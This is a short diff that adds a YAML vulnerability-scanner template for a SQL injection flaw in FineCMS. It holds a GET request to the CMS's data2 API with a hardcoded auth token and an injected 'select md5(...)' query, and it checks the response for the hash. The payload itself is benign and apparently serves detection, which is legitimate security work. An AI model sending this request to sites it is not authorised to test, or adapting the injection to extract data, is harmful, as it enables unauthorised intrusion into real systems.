@@ -1,0 +1,22 @@
+id: poc-yaml-finecms-sqli
+info:
+  name: Finecms SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Finecms
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{.rand}})%27
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, md5(rand))
+  output: []
